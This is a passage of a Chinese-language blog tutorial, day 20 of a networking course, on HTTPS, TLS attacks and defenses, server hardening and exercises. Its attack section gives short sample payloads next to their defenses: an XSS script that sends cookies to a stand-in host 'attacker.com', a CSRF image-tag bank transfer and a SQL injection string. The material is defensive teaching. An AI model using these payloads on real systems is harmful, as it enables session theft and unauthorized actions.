+4. 攻击者与服务器建立HTTPS连接
+5. 攻击者与客户端使用HTTP通信
+6. 客户端以为在用HTTPS（其实是HTTP）
+
+防御：
+✅ HSTS（强制HTTPS，不允许降级）
+✅ 不使用HTTP版本
+✅ 浏览器直接输入https://
+</code></pre><h3 id="63-证书欺诈">6.3 证书欺诈
+</h3><pre tabindex="0"><code>攻击方式：
+- 自签名证书
+- 伪造证书
+- 过期证书
+
+防御：
+✅ 浏览器证书验证
+✅ 证书透明度（CT）
+✅ 公钥固定
+✅ 警惕证书警告
+</code></pre><h3 id="64-其他攻击">6.4 其他攻击
+</h3><p><strong>XSS（跨站脚本攻击）</strong>：</p>
+<pre tabindex="0"><code>原理：
+注入恶意JavaScript代码
+
+示例：
+&lt;script&gt;
+  // 盗取Cookie
+  document.location=&#39;http://attacker.com/?c=&#39;+document.cookie;
+&lt;/script&gt;
+
+防御：
+✅ 输入验证和过滤
+✅ 输出编码
+✅ Content-Security-Policy
+✅ HttpOnly Cookie
+</code></pre><p><strong>CSRF（跨站请求伪造）</strong>：</p>
+<pre tabindex="0"><code>原理：
+利用用户已登录状态，发起恶意请求
+
+攻击：
+&lt;img src=&#34;http://bank.com/transfer?to=attacker&amp;amount=1000&#34;&gt;
+
+防御：
+✅ CSRF Token
+✅ SameSite Cookie
+✅ 验证Referer
+✅ 二次确认
+</code></pre><p><strong>SQL注入</strong>：</p>
+<pre tabindex="0"><code>原理：
+注入SQL代码
+
+示例：
+用户名：&#39; OR &#39;1&#39;=&#39;1
+SQL：SELECT * FROM users WHERE username=&#39;&#39; OR &#39;1&#39;=&#39;1&#39;
+结果：返回所有用户
+
+防御：
+✅ 参数化查询
+✅ ORM框架
+✅ 输入验证
+✅ 最小权限
+</code></pre><hr>
+<h2 id="7-https最佳实践">7. HTTPS最佳实践
+</h2><h3 id="71-服务器配置">7.1 服务器配置
+</h3><pre tabindex="0"><code>1. 只使用TLS 1.2和TLS 1.3
+   ssl_protocols TLSv1.2 TLSv1.3;
+
+2. 选择强加密套件
+   ssl_ciphers &#39;ECDHE-ECDSA-AES128-GCM-SHA256:...&#39;;
+   ssl_prefer_server_ciphers on;
+
+3. 启用HSTS
+   Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+4. 启用OCSP Stapling
+   ssl_stapling on;
+   ssl_stapling_verify on;
+
+5. 配置会话缓存
+   ssl_session_cache shared:SSL:10m;
+   ssl_session_timeout 10m;
+
+6. 使用证书链
+   ssl_certificate /path/to/fullchain.pem;
+   ssl_certificate_key /path/to/privkey.pem;
+</code></pre><h3 id="72-安全头部">7.2 安全头部
+</h3><pre tabindex="0"><code>1. Strict-Transport-Security（HSTS）
+   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+   强制使用HTTPS
+
+2. Content-Security-Policy（CSP）
+   Content-Security-Policy: default-src &#39;self&#39;
+   防止XSS攻击
+
+3. X-Content-Type-Options
+   X-Content-Type-Options: nosniff
+   防止MIME类型嗅探
+
+4. X-Frame-Options
+   X-Frame-Options: DENY
+   防止点击劫持
+
+5. X-XSS-Protection
+   X-XSS-Protection: 1; mode=block
+   防止XSS攻击
+
+6. Referrer-Policy
+   Referrer-Policy: no-referrer-when-downgrade
+   控制Referer信息
+</code></pre><h3 id="73-证书管理">7.3 证书管理
+</h3><pre tabindex="0"><code>1. 自动续期
+   - 使用Let&#39;s Encrypt + Certbot
+   - 设置定时任务
+   - 避免证书过期
+
+2. 证书监控
+   - 监控证书有效期
+   - 提前30天告警
+   - 自动化流程
+
+3. 多域名管理
+   - 使用通配符证书
+   - 或SAN证书
+   - 统一管理
+
+4. 证书透明度
+   - 提交证书到CT日志
+   - 监控证书颁发
+</code></pre><hr>
+<h2 id="8-实战项目https服务器">8. 实战项目：HTTPS服务器
+</h2><h3 id="81-项目需求">8.1 项目需求
+</h3><pre tabindex="0"><code>功能需求：
+1. 生成自签名证书
+2. 实现HTTPS服务器
+3. 实现HTTPS客户端
+4. 验证证书
+5. 加密通信
+
+技术要求：
+- 使用Python ssl模块
+- 支持TLS 1.2+
+- 证书验证
+- 安全配置
+</code></pre><h3 id="82-工具演示">8.2 工具演示
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. 生成自签名证书</span>
+</span></span><span style="display:flex;"><span>python day20_cert_generator.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. 启动HTTPS服务器</span>
+</span></span><span style="display:flex;"><span>python day20_https_server.py --host 0.0.0.0 --port <span style="color:#ae81ff">8443</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. 测试HTTPS客户端</span>
+</span></span><span style="display:flex;"><span>python day20_https_client.py --url https://127.0.0.1:8443/
+</span></span></code></pre></div><hr>
+<h2 id="9-今日练习">9. 今日练习
+</h2><h3 id="练习1证书分析">练习1：证书分析
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 查看证书信息</span>
+</span></span><span style="display:flex;"><span>openssl x509 -in cert.pem -text -noout
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 验证证书</span>
+</span></span><span style="display:flex;"><span>openssl verify -CAfile ca.pem cert.pem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查看网站证书</span>
+</span></span><span style="display:flex;"><span>openssl s_client -connect www.baidu.com:443 -showcerts
+</span></span></code></pre></div><h3 id="练习2抓包分析">练习2：抓包分析
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 使用Wireshark抓包</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. 分析TLS握手过程</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. 查看证书交换</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. 观察加密数据</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 使用tcpdump</span>
+</span></span><span style="display:flex;"><span>sudo tcpdump -i any -w https.pcap port <span style="color:#ae81ff">443</span>
+</span></span></code></pre></div><h3 id="练习3配置https">练习3：配置HTTPS
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 为第19天的HTTP服务器添加HTTPS支持</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. 生成证书</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. 配置SSL</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. 测试HTTPS连接</span>
+</span></span></code></pre></div><h3 id="练习4安全测试">练习4：安全测试
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 使用SSL Labs测试网站安全性</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://www.ssllabs.com/ssltest/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 检查项目：</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - 证书有效性</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - 协议支持</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - 加密套件</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - 安全漏洞</span>
+</span></span></code></pre></div><hr>
+<h2 id="10-常见问题">10. 常见问题
+</h2><p><strong>Q1：HTTPS会影响性能吗？</strong></p>
+<p>A：</p>
+<ul>
+<li>有一定影响，但可以接受</li>
+<li>TLS 1.3大幅优化</li>
+<li>使用HTTP/2可以提升性能</li>
+<li>CDN可以分担负载</li>
+</ul>
+<p><strong>Q2：自签名证书和CA签名证书有什么区别？</strong></p>
+<p>A：</p>
+<ul>
+<li>自签名：自己签名，不被信任</li>
+<li>CA签名：权威机构签名，被信任</li>
+<li>自签名只用于测试</li>
+<li>生产环境必须用CA证书</li>
+</ul>
+<p><strong>Q3：Let&rsquo;s Encrypt是否安全？</strong></p>
+<p>A：</p>
+<ul>
+<li>完全安全</li>
+<li>免费但不降低安全性</li>
+<li>只是自动化了流程</li>
+<li>被主流浏览器信任</li>
+</ul>
+<p><strong>Q4：HTTPS一定安全吗？</strong></p>
+<p>A：</p>
+<ul>
+<li>不一定</li>
+<li>HTTPS只保证传输安全</li>
+<li>服务器本身可能不安全</li>
+<li>钓鱼网站也可以有HTTPS</li>
+</ul>
+<p><strong>Q5：HTTP/2必须用HTTPS吗？</strong></p>
+<p>A：</p>
+<ul>
+<li>标准上不强制</li>
+<li>但所有浏览器都只支持HTTPS版本</li>
+<li>实际上必须用HTTPS</li>
+</ul>
+<hr>
+<h2 id="11-总结">11. 总结
+</h2><p>今天我们学习了：</p>
+<h3 id="核心知识点">核心知识点
+</h3><ol>
+<li>
+<p><strong>HTTPS基础</strong>：</p>
+<ul>
+<li>HTTP + TLS/SSL</li>
+<li>解决窃听、篡改、冒充</li>
+</ul>
+</li>
+<li>
+<p><strong>加密技术</strong>：</p>
+<ul>
+<li>对称加密：AES</li>
+<li>非对称加密：RSA</li>
+<li>哈希函数：SHA-256</li>
+<li>数字签名：身份认证</li>
+</ul>
+</li>
+<li>
+<p><strong>TLS协议</strong>：</p>
+<ul>
+<li>TLS 1.2：2-RTT握手</li>
+<li>TLS 1.3：1-RTT握手</li>
+<li>协商、认证、加密</li>
+</ul>
+</li>
+<li>
+<p><strong>数字证书</strong>：</p>
+<ul>
+<li>服务器身份证明</li>
+<li>CA签名</li>
+<li>信任链</li>
+</ul>
+</li>
+<li>
+<p><strong>安全攻击</strong>：</p>
+<ul>
+<li>MITM：中间人攻击</li>
+<li>SSL剥离</li>
+<li>XSS、CSRF、SQL注入</li>
+</ul>
+</li>
+<li>
+<p><strong>最佳实践</strong>：</p>
+<ul>
+<li>只用TLS 1.2+</li>
+<li>强加密套件</li>
+<li>HSTS</li>
+<li>安全头部</li>
+</ul>
+</li>
+</ol>
+<h3 id="重点回顾">重点回顾
+</h3><pre tabindex="0"><code>HTTPS工作原理：
+1. 客户端发起连接（ClientHello）
+2. 服务器返回证书（Certificate）
+3. 客户端验证证书
+4. 密钥交换（KeyExchange）
+5. 切换到加密通信
+6. 传输加密数据
+
+混合加密：
+非对称加密（RSA）→ 交换密钥
+对称加密（AES）→ 加密数据
+
+证书验证：
+检查有效期 → 验证CA签名 → 检查域名 → 检查吊销状态
+</code></pre><h3 id="明天预告">明天预告
+</h3><p><strong>第21天：第三周总结与实战</strong></p>
+<p>内容预览：</p>
+<ul>
+<li>本周知识回顾</li>
+<li>综合实战项目</li>
+<li>性能优化技巧</li>
+<li>调试和排错</li>
+<li>工具和资源推荐</li>
+</ul>
+<hr>
+<p><strong>继续加油！</strong> 🚀</p>
+<p>今天我们学习了HTTPS和Web安全，这是现代互联网的基础。理解HTTPS的工作原理对于开发安全的Web应用至关重要。明天我们将进行第三周的总结，并完成一个综合实战项目！</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/network/">Network</a>
+        
+            <a href="/tags/book/">Book</a>
+        
+            <a href="/tags/python/">Python</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E5%9B%9B%E5%91%A8%E6%80%BB%E7%BB%93%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">四周总结：网络层协议</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/19%E5%A4%A9http%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">19天：HTTP协议基础</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/18%E5%A4%A9socket%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">18天：Socket编程进阶</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/17%E5%A4%A9udp%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">17天：UDP协议详解</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/16%E5%A4%A9tcp%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E6%9C%BA%E5%88%B6/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">16天：TCP可靠传输机制</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Diyouo
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="4.0.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+    
+
+            </main>
+        </div>
+        
+<script type="text/javascript" src="/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js" defer></script>
+
+
+    </body>
+</html>
